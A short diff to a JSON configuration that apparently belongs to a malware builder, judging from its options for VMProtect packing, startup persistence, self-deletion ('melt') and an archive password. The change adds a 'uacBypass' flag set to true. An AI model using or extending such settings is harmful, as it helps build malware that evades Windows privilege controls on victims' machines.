@@ -5,6 +5,7 @@
         "vmprotect" : true,
         "startup" : true,
         "melt" : false,
+        "uacBypass" : true,
         "archivePassword" : "blank",
         "consoleMode" : 0,
         "debug" : false
